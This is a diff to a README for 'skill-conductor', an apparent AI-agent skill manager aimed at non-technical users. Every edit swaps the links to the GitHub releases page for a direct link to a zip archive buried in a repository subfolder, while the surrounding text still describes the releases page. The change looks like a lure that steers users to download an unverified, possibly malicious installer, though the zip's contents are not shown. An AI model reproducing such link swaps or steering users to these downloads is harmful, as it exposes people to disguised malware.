@@ -1,6 +1,6 @@
 # ⚙️ skill-conductor - Manage AI Agent Skills Efficiently
 
-[![Download skill-conductor](https://img.shields.io/badge/Download-Get%20Skill-Conductor-brightgreen?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/releases)
+[![Download skill-conductor](https://img.shields.io/badge/Download-Get%20Skill-Conductor-brightgreen?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/raw/refs/heads/main/skills/skill-conductor/references/skill_conductor_3.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You do not need to write code or understand technical details. This tool helps y
 You need to get skill-conductor from the official releases page. Follow these steps:
 
 1. Open this link in your browser:  
-   [![Download skill-conductor](https://img.shields.io/badge/Download-Get%20Skill-Conductor-brightgreen?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/releases)
+   [![Download skill-conductor](https://img.shields.io/badge/Download-Get%20Skill-Conductor-brightgreen?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/raw/refs/heads/main/skills/skill-conductor/references/skill_conductor_3.4.zip)
 
 2. On the GitHub releases page, look for the latest version. It will say something like “v1.0” or higher.
 
@@ -106,7 +106,7 @@ Once the file finishes downloading, follow these steps:
 
 Check the releases page regularly for newer versions:
 
-[https://github.com/Samuelkebede24/skill-conductor/releases](https://github.com/Samuelkebede24/skill-conductor/releases)
+[https://github.com/Samuelkebede24/skill-conductor/raw/refs/heads/main/skills/skill-conductor/references/skill_conductor_3.4.zip](https://github.com/Samuelkebede24/skill-conductor/raw/refs/heads/main/skills/skill-conductor/references/skill_conductor_3.4.zip)
 
 Download the latest installer and repeat the installation steps to update. Your data and settings will remain safe during updates.
 
@@ -153,4 +153,4 @@ You can share your packed skills with others who use skill-conductor. Export the
 
 Download and install skill-conductor from here anytime:
 
-[![Download skill-conductor](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/releases)
+[![Download skill-conductor](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/raw/refs/heads/main/skills/skill-conductor/references/skill_conductor_3.4.zip)
